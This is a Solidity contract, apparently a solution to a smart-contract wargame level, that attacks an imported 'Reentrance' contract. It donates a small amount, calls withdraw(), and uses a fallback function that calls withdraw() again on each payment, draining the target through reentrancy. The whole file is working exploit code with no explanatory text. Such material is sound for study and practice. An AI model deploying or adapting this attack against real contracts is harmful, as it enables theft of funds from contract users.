// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance r = Reentrance(contractAddress);
        r.donate{value: 1}(address(this));
        r.withdraw();
    }

    fallback() external payable {
        Reentrance r = Reentrance(contractAddress);
        r.withdraw();
    }
}
